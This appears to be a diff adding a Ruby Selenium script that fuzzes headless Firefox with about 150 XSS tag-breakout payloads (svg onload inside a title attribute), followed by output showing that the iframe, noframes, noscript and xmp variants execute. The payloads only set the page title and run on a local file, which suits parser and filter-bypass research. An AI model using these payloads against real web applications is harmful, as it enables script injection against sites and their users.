@@ -1,0 +1,167 @@
+require 'selenium-webdriver'
+
+arr = [
+    '<area><p title="</area><svg/onload=document.title=(`area`)>">',
+    '<article><p title="</article><svg/onload=document.title=(`article`)>">',
+    '<aside><p title="</aside><svg/onload=document.title=(`aside`)>">',
+    '<audio><p title="</audio><svg/onload=document.title=(`audio`)>">',
+    '<b><p title="</b><svg/onload=document.title=(`b`)>">',
+    '<base><p title="</base><svg/onload=document.title=(`base`)>">',
+    '<basefont><p title="</basefont><svg/onload=document.title=(`basefont`)>">',
+    '<bdi><p title="</bdi><svg/onload=document.title=(`bdi`)>">',
+    '<bdo><p title="</bdo><svg/onload=document.title=(`bdo`)>">',
+    '<bgsound><p title="</bgsound><svg/onload=document.title=(`bgsound`)>">',
+    '<big><p title="</big><svg/onload=document.title=(`big`)>">',
+    '<blink><p title="</blink><svg/onload=document.title=(`blink`)>">',
+    '<blockquote><p title="</blockquote><svg/onload=document.title=(`blockquote`)>">',
+    '<body><p title="</body><svg/onload=document.title=(`body`)>">',
+    '<p title="</br><svg/onload=document.title=(`br`)>">',
+    '<button><p title="</button><svg/onload=document.title=(`button`)>">',
+    '<canvas><p title="</canvas><svg/onload=document.title=(`canvas`)>">',
+    '<caption><p title="</caption><svg/onload=document.title=(`caption`)>">',
+    '<center><p title="</center><svg/onload=document.title=(`center`)>">',
+    '<cite><p title="</cite><svg/onload=document.title=(`cite`)>">',
+    '<code><p title="</code><svg/onload=document.title=(`code`)>">',
+    '<col><p title="</col><svg/onload=document.title=(`col`)>">',
+    '<colgroup><p title="</colgroup><svg/onload=document.title=(`colgroup`)>">',
+    '<content><p title="</content><svg/onload=document.title=(`content`)>">',
+    '<data><p title="</data><svg/onload=document.title=(`data`)>">',
+    '<datalist><p title="</datalist><svg/onload=document.title=(`datalist`)>">',
+    '<dd><p title="</dd><svg/onload=document.title=(`dd`)>">',
+    '<del><p title="</del><svg/onload=document.title=(`del`)>">',
+    '<details><p title="</details><svg/onload=document.title=(`details`)>">',
+    '<dfn><p title="</dfn><svg/onload=document.title=(`dfn`)>">',
+    '<dialog><p title="</dialog><svg/onload=document.title=(`dialog`)>">',
+    '<dir><p title="</dir><svg/onload=document.title=(`dir`)>">',
+    '<div><p title="</div><svg/onload=document.title=(`div`)>">',
+    '<dl><p title="</dl><svg/onload=document.title=(`dl`)>">',
+    '<dt><p title="</dt><svg/onload=document.title=(`dt`)>">',
+    '<em><p title="</em><svg/onload=document.title=(`em`)>">',
+    '<embed><p title="</embed><svg/onload=document.title=(`embed`)>">',
+    '<fieldset><p title="</fieldset><svg/onload=document.title=(`fieldset`)>">',
+    '<figcaption><p title="</figcaption><svg/onload=document.title=(`figcaption`)>">',
+    '<figure><p title="</figure><svg/onload=document.title=(`figure`)>">',
+    '<font><p title="</font><svg/onload=document.title=(`font`)>">',
+    '<footer><p title="</footer><svg/onload=document.title=(`footer`)>">',
+    '<form><p title="</form><svg/onload=document.title=(`form`)>">',
+    '<frame><p title="</frame><svg/onload=document.title=(`frame`)>">',
+    '<frameset><p title="</frameset><svg/onload=document.title=(`frameset`)>">',
+    '<h1><p title="</h1><svg/onload=document.title=(`h1`)>">',
+    '<h2><p title="</h2><svg/onload=document.title=(`h2`)>">',
+    '<h3><p title="</h3><svg/onload=document.title=(`h3`)>">',
+    '<h4><p title="</h4><svg/onload=document.title=(`h4`)>">',
+    '<h5><p title="</h5><svg/onload=document.title=(`h5`)>">',
+    '<h6><p title="</h6><svg/onload=document.title=(`h6`)>">',
+    '<head><p title="</head><svg/onload=document.title=(`head`)>">',
+    '<header><p title="</header><svg/onload=document.title=(`header`)>">',
+    '<hgroup><p title="</hgroup><svg/onload=document.title=(`hgroup`)>">',
+    '<hr><p title="</hr><svg/onload=document.title=(`hr`)>">',
+    '<html><p title="</html><svg/onload=document.title=(`html`)>">',
+    '<i><p title="</i><svg/onload=document.title=(`i`)>">',
+    '<iframe><p title="</iframe><svg/onload=document.title=(`iframe`)>">',
+        '<img><p title="</img><svg/onload=document.title=(`img`)>">',
+        '<input><p title="</input><svg/onload=document.title=(`input`)>">',
+        '<ins><p title="</ins><svg/onload=document.title=(`ins`)>">',
+    '<isindex><p title="</isindex><svg/onload=document.title=(`isindex`)>">',
+        '<kbd><p title="</kbd><svg/onload=document.title=(`kbd`)>">',
+        '<keygen><p title="</keygen><svg/onload=document.title=(`keygen`)>">',
+        '<label><p title="</label><svg/onload=document.title=(`label`)>">',
+        '<legend><p title="</legend><svg/onload=document.title=(`legend`)>">',
+        '<li><p title="</li><svg/onload=document.title=(`li`)>">',
+        '<link><p title="</link><svg/onload=document.title=(`link`)>">',
+        '<listing><p title="</listing><svg/onload=document.title=(`listing`)>">',
+        '<main><p title="</main><svg/onload=document.title=(`main`)>">',
+        '<map><p title="</map><svg/onload=document.title=(`map`)>">',
+        '<mark><p title="</mark><svg/onload=document.title=(`mark`)>">',
+        '<marquee><p title="</marquee><svg/onload=document.title=(`marquee`)>">',
+        '<menu><p title="</menu><svg/onload=document.title=(`menu`)>">',
+        '<menuitem><p title="</menuitem><svg/onload=document.title=(`menuitem`)>">',
+        '<meta><p title="</meta><svg/onload=document.title=(`meta`)>">',
+        '<meter><p title="</meter><svg/onload=document.title=(`meter`)>">',
+        '<nav><p title="</nav><svg/onload=document.title=(`nav`)>">',
+        '<nobr><p title="</nobr><svg/onload=document.title=(`nobr`)>">',
+        '<noframes><p title="</noframes><svg/onload=document.title=(`noframes`)>">',
+        '<noscript><p title="</noscript><svg/onload=document.title=(`noscript`)>">',
+        '<object><p title="</object><svg/onload=document.title=(`object`)>">',
+        '<ol><p title="</ol><svg/onload=document.title=(`ol`)>">',
+        '<optgroup><p title="</optgroup><svg/onload=document.title=(`optgroup`)>">',
+        '<option><p title="</option><svg/onload=document.title=(`option`)>">',
+        '<output><p title="</output><svg/onload=document.title=(`output`)>">',
+    '<p><p title="</p><svg/onload=document.title=(`p`)>">',
+        '<param><p title="</param><svg/onload=document.title=(`param`)>">',
+        '<picture><p title="</picture><svg/onload=document.title=(`picture`)>">',
+        '<plaintext><p title="</plaintext><svg/onload=document.title=(`plaintext`)>">',
+        '<pre><p title="</pre><svg/onload=document.title=(`pre`)>">',
+        '<progress><p title="</progress><svg/onload=document.title=(`progress`)>">',
+        '<q><p title="</q><svg/onload=document.title=(`q`)>">',
+        '<rp><p title="</rp><svg/onload=document.title=(`rp`)>">',
+        '<rt><p title="</rt><svg/onload=document.title=(`rt`)>">',
+        '<rtc><p title="</rtc><svg/onload=document.title=(`rtc`)>">',
+        '<ruby><p title="</ruby><svg/onload=document.title=(`ruby`)>">',
+        '<s><p title="</s><svg/onload=document.title=(`s`)>">',
+        '<samp><p title="</samp><svg/onload=document.title=(`samp`)>">',
+        '<section><p title="</section><svg/onload=document.title=(`section`)>">',
+        '<select><p title="</select><svg/onload=document.title=(`select`)>">',
+        '<shadow><p title="</shadow><svg/onload=document.title=(`shadow`)>">',
+        '<slot><p title="</slot><svg/onload=document.title=(`slot`)>">',
+        '<small><p title="</small><svg/onload=document.title=(`small`)>">',
+        '<source><p title="</source><svg/onload=document.title=(`source`)>">',
+        '<spacer><p title="</spacer><svg/onload=document.title=(`spacer`)>">',
+        '<span><p title="</span><svg/onload=document.title=(`span`)>">',
+        '<strike><p title="</strike><svg/onload=document.title=(`strike`)>">',
+        '<strong><p title="</strong><svg/onload=document.title=(`strong`)>">',
+        '<style><p title="</style><svg/onload=document.title=(`style`)>">',
+        '<sub><p title="</sub><svg/onload=document.title=(`sub`)>">',
+        '<summary><p title="</summary><svg/onload=document.title=(`summary`)>">',
+        '<sup><p title="</sup><svg/onload=document.title=(`sup`)>">',
+        '<table><p title="</table><svg/onload=document.title=(`table`)>">',
+        '<tbody><p title="</tbody><svg/onload=document.title=(`tbody`)>">',
+        '<td><p title="</td><svg/onload=document.title=(`td`)>">',
+        '<template><p title="</template><svg/onload=document.title=(`template`)>">',
+        '<textarea><p title="</textarea><svg/onload=document.title=(`textarea`)>">',
+        '<tfoot><p title="</tfoot><svg/onload=document.title=(`tfoot`)>">',
+        '<th><p title="</th><svg/onload=document.title=(`th`)>">',
+        '<thead><p title="</thead><svg/onload=document.title=(`thead`)>">',
+        '<time><p title="</time><svg/onload=document.title=(`time`)>">',
+        '<title><p title="</title><svg/onload=document.title=(`title`)>">',
+        '<tr><p title="</tr><svg/onload=document.title=(`tr`)>">',
+        '<track><p title="</track><svg/onload=document.title=(`track`)>">',
+        '<tt><p title="</tt><svg/onload=document.title=(`tt`)>">',
+        '<u><p title="</u><svg/onload=document.title=(`u`)>">',
+        '<ul><p title="</ul><svg/onload=document.title=(`ul`)>">',
+        '<var><p title="</var><svg/onload=document.title=(`var`)>">',
+        '<video><p title="</video><svg/onload=document.title=(`video`)>">',
+        '<wbr><p title="</wbr><svg/onload=document.title=(`wbr`)>">',
+        '<xmp><p title="</xmp><svg/onload=document.title=(`xmp`)>">'
+        ]
+
+options = Selenium::WebDriver::Firefox::Options.new
+options.add_argument('--headless')
+driver = Selenium::WebDriver.for :firefox, options: options
+
+#driver.navigate.to "https://www.hahwul.com"
+#p driver.title
+
+arr.each do |node|
+# driver.navigate.to "data://<script></script>"
+  f = open('./payload.html','r+')
+  f.write "<html>#{node}</html>"
+  driver.navigate.to "file:///#{`pwd`}/payload.html"
+  #p "Tested :: "+node
+  if driver.title.to_s.length > 4
+    #p "Found! "+node
+    p driver.title
+  end
+end
+
+
+
+$ ruby test.rb
+"iframe"
+"noframes"
+"noscript"
+"xmp"
+
+
+
+
